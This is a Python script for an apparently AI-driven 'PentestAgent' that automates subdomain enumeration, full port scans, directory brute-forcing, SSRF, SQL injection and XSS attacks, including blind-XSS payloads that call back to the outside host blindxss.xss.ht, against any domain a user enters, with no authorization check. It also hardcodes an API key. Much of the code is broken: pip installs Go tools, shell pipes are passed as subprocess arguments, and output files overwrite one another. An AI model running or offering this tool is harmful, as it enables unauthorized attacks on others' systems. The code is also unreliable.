import os
import subprocess
import time
from deepseek import DeepSeekAgent  # Hypothetical AI framework

class PentestAgent(DeepSeekAgent):
    def __init__(self, domain, api_key):
        super().__init__(api_key)
        self.domain = domain
        self.setup_folders()

    def install_dependencies(self):
        print("[*] Checking and installing dependencies...")
        packages = ["subfinder", "assetfinder", "amass", "chaos", "alterx", "subjack", "shodan", "masscan", "dirsearch", "httpx", "waybackurls", "ffuf", "gau", "katana", "galer", "Gxss", "dalfox", "gf", "nuclei", "xsstrike", "kxss"]
        for pkg in packages:
            subprocess.run(["pip", "install", pkg])

    def setup_folders(self):
        print("[*] Setting up directories...")
        os.makedirs(f"bugbounty/{self.domain}", exist_ok=True)
        os.makedirs(f"recon_results/{self.domain}/subdomains", exist_ok=True)
        os.makedirs(f"recon_results/{self.domain}/takeover", exist_ok=True)
        os.makedirs(f"recon_results/{self.domain}/internal_ips", exist_ok=True)
        os.makedirs(f"recon_results/{self.domain}/port_scans", exist_ok=True)
        os.makedirs(f"recon_results/{self.domain}/directory_bruteforce", exist_ok=True)
        os.makedirs(f"recon_results/{self.domain}/extracted_urls", exist_ok=True)
        os.makedirs(f"recon_results/{self.domain}/gf_parameters", exist_ok=True)
        os.makedirs(f"recon_results/{self.domain}/result", exist_ok=True)
        os.makedirs(f"recon_results/{self.domain}/xss", exist_ok=True)
        os.makedirs(f"recon_results/{self.domain}/cve", exist_ok=True)

    def enumerate_subdomains(self):
        print(f"[*] Enumerating subdomains for {self.domain}...")
        subprocess.run(["subfinder", "-d", self.domain, "-o", f"recon_results/{self.domain}/subdomains/sub1.txt"])
        subprocess.run(["assetfinder", "--subs-only", self.domain, "-o", f"recon_results/{self.domain}/subdomains/sub2.txt"])
        subprocess.run(["amass", "enum", "-norecursive", "-noalts", "-d", self.domain, "-o", f"recon_results/{self.domain}/subdomains/sub3.txt"])
        subprocess.run(["chaos", "-d", self.domain, "-o", f"recon_results/{self.domain}/subdomains/sub4.txt"])
        subprocess.run(["alterx", "-d", self.domain, "-o", f"recon_results/{self.domain}/subdomains/sub5.txt"])
        subprocess.run(["findomain", "--external-subdomains", "--output", "--target", self.domain, "--unique-output", f"recon_results/{self.domain}/subdomains/sub6.txt"])

        with open(f"recon_results/{self.domain}/subdomains/all_subdomains.txt", "w") as outfile:
            for subfile in ["sub1.txt", "sub2.txt", "sub3.txt", "sub4.txt", "sub5.txt", "sub6.txt"]:
                with open(f"recon_results/{self.domain}/subdomains/{subfile}") as infile:
                    outfile.write(infile.read())

    def check_takeover(self):
        print(f"[*] Checking for subdomain takeovers for {self.domain}...")
        subprocess.run(["subjack", "-w", f"recon_results/{self.domain}/subdomains/all_subdomains.txt", "-t", "100", "-timeout", "30", "-ssl", "-c", "/usr/share/subjack/fingerprints.json", "-v", "-o", f"recon_results/{self.domain}/result/takeover.txt"])

    def extract_links(self):
        print(f"[*] Extracting URLs for {self.domain}...")
        subprocess.run(["httpx", "-l", f"recon_results/{self.domain}/subdomains/all_subdomains.txt", "-o", f"recon_results/{self.domain}/extracted_urls/live_links.txt"])
        subprocess.run(["httprobe", "-c", "10", "-l", f"recon_results/{self.domain}/subdomains/all_subdomains.txt", "-o", f"recon_results/{self.domain}/extracted_urls/live_links.txt"])

        with open(f"recon_results/{self.domain}/extracted_urls/live_links.txt", "r") as infile:
            unique_links = set(infile.readlines())

        with open(f"recon_results/{self.domain}/extracted_urls/unique_links.txt", "w") as outfile:
            outfile.writelines(unique_links)

        subprocess.run(["gau", "-o", f"recon_results/{self.domain}/extracted_urls/extracted.txt", "-l", f"recon_results/{self.domain}/extracted_urls/unique_links.txt"])
        subprocess.run(["waybackurls", "-o", f"recon_results/{self.domain}/extracted_urls/extracted.txt", "-l", f"recon_results/{self.domain}/extracted_urls/unique_links.txt"])

        with open(f"recon_results/{self.domain}/extracted_urls/extracted.txt", "r") as infile:
            cleaned_urls = set(infile.readlines())

        with open(f"recon_results/{self.domain}/extracted_urls/cleaned_urls.txt", "w") as outfile:
            outfile.writelines(cleaned_urls)

        subprocess.run(["httpx", "-l", f"recon_results/{self.domain}/extracted_urls/cleaned_urls.txt", "-o", f"recon_results/{self.domain}/extracted_urls/final_urls.txt"])
        subprocess.run(["httprobe", "-c", "10", "-l", f"recon_results/{self.domain}/extracted_urls/cleaned_urls.txt", "-o", f"recon_results/{self.domain}/extracted_urls/final_urls.txt"])
        subprocess.run(["katana", "-d", "4", "-o", f"recon_results/{self.domain}/extracted_urls/final_urls.txt", "-l", f"recon_results/{self.domain}/extracted_urls/cleaned_urls.txt"])
        subprocess.run(["galer", "-o", f"recon_results/{self.domain}/extracted_urls/final_urls.txt", "-l", f"recon_results/{self.domain}/extracted_urls/cleaned_urls.txt"])

    def gf_analysis(self):
        print(f"[*] Running gf pattern matching for {self.domain}...")
        file = f"recon_results/{self.domain}/extracted_urls/final_urls.txt"

        if not os.path.isfile(file):
            print("Error: No extracted URLs found!")
            return

        os.makedirs(f"recon_results/{self.domain}/gf_parameters", exist_ok=True)

        patterns = ["debug_logic", "idor", "img-traversal", "interestingEXT", "interestingparams", "interestingsubs", "jsvar", "lfi", "rce", "redirect", "sqli", "ssrf", "ssti", "xss"]
        for pattern in patterns:
            print(f"[*] Running gf for {pattern}...")
            os.makedirs(f"recon_results/{self.domain}/gf_parameters/{pattern}", exist_ok=True)
            subprocess.run(["gf", pattern, "-o", f"recon_results/{self.domain}/gf_parameters/{pattern}/{pattern}.txt", "-l", file])

    def perform_port_scan(self):
        print(f"[*] Performing port scan on {self.domain}...")
        subprocess.run(["nmap", self.domain, "-p1-65535", "--rate=1000", "-oN", f"recon_results/{self.domain}/port_scans/ports.txt"])

    def directory_bruteforce(self):
        print(f"[*] Performing directory brute-forcing on {self.domain}...")
        subprocess.run(["dirsearch", "-u", self.domain, "-e", "*", "-o", f"recon_results/{self.domain}/directory_bruteforce/dirsearch.txt"])

    def test_vulnerabilities(self):
        print(f"[*] Running vulnerability tests for {self.domain}...")

        # XSS Testing
        self.find_xss_vulnerabilities()

        # SSRF Testing
        subprocess.run(["ssrftool", "-domains", f"recon_results/{self.domain}/extracted_urls/unique_links.txt", "-payloads", "~/.git/ssrf-tool/important/payloads.txt", "-silent=false", "-paths=true", "-patterns", "~/.git/ssrf-tool/important/patterns.txt", "-o", f"recon_results/{self.domain}/result/ssrf1.txt"])
        subprocess.run(["ssrftool", "-domains", f"recon_results/{self.domain}/extracted_urls/cleaned_urls.txt", "-payloads", "~/.git/ssrf-tool/important/payloads.txt", "-silent=false", "-paths=true", "-patterns", "~/.git/ssrf-tool/important/patterns.txt", "-o", f"recon_results/{self.domain}/result/ssrf2.txt"])
        subprocess.run(["ssrftool", "-domains", f"recon_results/{self.domain}/ssrf/ssrf1.txt", "-payloads", "~/.git/ssrf-tool/important/payloads.txt", "-silent=false", "-paths=true", "-patterns", "~/.git/ssrf-tool/important/patterns.txt", "-o", f"recon_results/{self.domain}/result/ssrf3.txt"])

        # SQL Injection Testing
        subprocess.run(["bash", "sqli", f"recon_results/{self.domain}/gf_parameters/sqli/sqli.txt", "-o", f"recon_results/{self.domain}/result/sqli_sqlmap_result.txt"])

        # Nuclei Vulnerability Scanner
        subprocess.run(["nuclei", "-t", "./nuclei-templates/", "-o", f"recon_results/{self.domain}/result/result.txt", "-l", f"recon_results/{self.domain}/extracted_urls/final_urls.txt"])

    def find_xss_vulnerabilities(self):
        print(f"[*] Finding XSS vulnerabilities for {self.domain}...")

        # Reflected XSS Methods
        self.reflected_xss_methods()

        # Stored XSS Methods
        self.stored_xss_methods()

        # Blind XSS Methods
        self.blind_xss_methods()

        # DOM XSS Methods
        self.dom_xss_methods()

        # Generate XSS Report
        self.generate_xss_report()

    def reflected_xss_methods(self):
        print(f"[*] Finding Reflected XSS vulnerabilities for {self.domain}...")

        # Method 1: Using XSS Scanners
        subprocess.run(["xsstrike", "-u", f"recon_results/{self.domain}/extracted_urls/final_urls.txt", "-o", f"recon_results/{self.domain}/xss/xsstrike.txt"])
        subprocess.run(["kxss", "-i", f"recon_results/{self.domain}/extracted_urls/final_urls.txt", "-o", f"recon_results/{self.domain}/xss/kxss.txt"])
        
        
        
        # Method 2: Using Waybackurls and similar tools
        
        subprocess.run(["gau", "-o", f"recon_results/{self.domain}/xss/waybackurls.txt", self.domain])
        subprocess.run(["grep", "=", f"recon_results/{self.domain}/xss/waybackurls.txt", ">", f"recon_results/{self.domain}/xss/params.txt"])
        subprocess.run(["Gxss", "-o", f"recon_results/{self.domain}/xss/gxss.txt", "-l", f"recon_results/{self.domain}/xss/params.txt"])
        subprocess.run(["dalfox", "pipe", "-o", f"recon_results/{self.domain}/xss/dalfox.txt", "-l", f"recon_results/{self.domain}/xss/gxss.txt"])

        # Method 3: Using Google Dorks (Manual Step)
        print("[*] Use Google Dorks to find URLs with parameters and test for XSS manually or with tools.")

        # Method 4: Find Hidden Variables in Source Code
        print("[*] Check JavaScript and HTML source files for hidden or unused variables.")

        # Method 5: Other Methods
        print("[*] Use Arjun to find hidden parameters and test for XSS.")

        # Automated XSS Detection
        print("[*] Running automated XSS detection...")
        subprocess.run(["waybackurls", self.domain, "|", "gf", "xss", "|", "sed", "'s/=.*/=/'", "|", "sort", "-u", "|", "tee", "Possible_xss.txt", "&&", "cat", "Possible_xss.txt", "|", "dalfox", "-b", "blindxss.xss.ht", "pipe", ">", "output.txt"])

    def stored_xss_methods(self):
        print(f"[*] Finding Stored XSS vulnerabilities for {self.domain}...")

        # Try payloads in various input fields
        print("[*] Test for stored XSS in input fields, comments, profile pictures, etc.")

    def blind_xss_methods(self):
        print(f"[*] Finding Blind XSS vulnerabilities for {self.domain}...")

        # Use XSS Hunter or similar tools
        print("[*] Use XSS Hunter or similar tools to find blind XSS vulnerabilities.")

    def dom_xss_methods(self):
        print(f"[*] Finding DOM XSS vulnerabilities for {self.domain}...")

        # Use Burp Suite PRO scanner or other tools
        print("[*] Use Burp Suite PRO scanner or other tools to find DOM XSS vulnerabilities.")

        # Automated DOM XSS Detection
        print("[*] Running automated DOM XSS detection...")
        sources = [
            "document.URL", "document.documentURI", "document.URLUnencoded", "document.baseURI", "location",
            "location.href", "location.search", "location.hash", "location.pathname", "document.cookie",
            "document.referrer", "window.name", "history.pushState", "history.replaceState", "localStorage",
            "sessionStorage"
        ]
        sinks = [
            "eval", "Function", "setTimeout", "setInterval", "setImmediate", "execScript", "crypto.generateCRMFRequest",
            "ScriptElement.src", "ScriptElement.text", "ScriptElement.textContent", "ScriptElement.innerText",
            "anyTag.onEventName", "document.write", "document.writeln", "anyElement.innerHTML",
            "Range.createContextualFragment", "window.location", "document.location"
        ]
        for source in sources:
            for sink in sinks:
                subprocess.run(["grep", "-r", f"{source}.*{sink}", f"recon_results/{self.domain}/extracted_urls/"])

    def generate_xss_report(self):
        print(f"[*] Generating XSS report for {self.domain}...")

        report_path = f"recon_results/{self.domain}/xss/xss_report.txt"
        with open(report_path, "w") as report:
            report.write(f"XSS Vulnerability Report for {self.domain}\n")
            report.write("="*50 + "\n\n")

            tools = ["gxss", "dalfox", "xsstrike", "kxss", "nuclei_xss"]
            for tool in tools:
                report.write(f"Results from {tool}:\n")
                result_file = f"recon_results/{self.domain}/xss/{tool}.txt"
                if os.path.isfile(result_file):
                    with open(result_file, "r") as result:
                        report.write(result.read())
                else:
                    report.write("No results found.\n")
                report.write("\n" + "="*50 + "\n\n")

        print(f"[*] XSS report generated at {report_path}")

    def find_cve_vulnerabilities(self):
        print(f"[*] Finding CVE vulnerabilities for {self.domain}...")

        # Using Nuclei for CVEs
        subprocess.run(["nuclei", "-t", "cves/", "-o", f"recon_results/{self.domain}/cve/nuclei_cve.txt", "-l", f"recon_results/{self.domain}/extracted_urls/final_urls.txt"])

        # Generate CVE Report
        self.generate_cve_report()

    def generate_cve_report(self):
        print(f"[*] Generating CVE report for {self.domain}...")

        report_path = f"recon_results/{self.domain}/cve/cve_report.txt"
        with open(report_path, "w") as report:
            report.write(f"CVE Vulnerability Report for {self.domain}\n")
            report.write("="*50 + "\n\n")

            tools = ["nuclei_cve"]
            for tool in tools:
                report.write(f"Results from {tool}:\n")
                result_file = f"recon_results/{self.domain}/cve/{tool}.txt"
                if os.path.isfile(result_file):
                    with open(result_file, "r") as result:
                        report.write(result.read())
                else:
                    report.write("No results found.\n")
                report.write("\n" + "="*50 + "\n\n")

        print(f"[*] CVE report generated at {report_path}")

    def run(self):
        self.install_dependencies()
        self.enumerate_subdomains()
        self.check_takeover()
        self.extract_links()
        self.gf_analysis()
        self.perform_port_scan()
        self.directory_bruteforce()
        self.test_vulnerabilities()
        self.find_cve_vulnerabilities()
        print(f"[*] Recon process completed for {self.domain}!")

if __name__ == "__main__":
    domain = input("Enter the domain to scan: ")
    api_key = "sk-36312949694f430c9c60510a728c6416"  # Your DeepSeek API key
    agent = PentestAgent(domain, api_key)
    agent.run()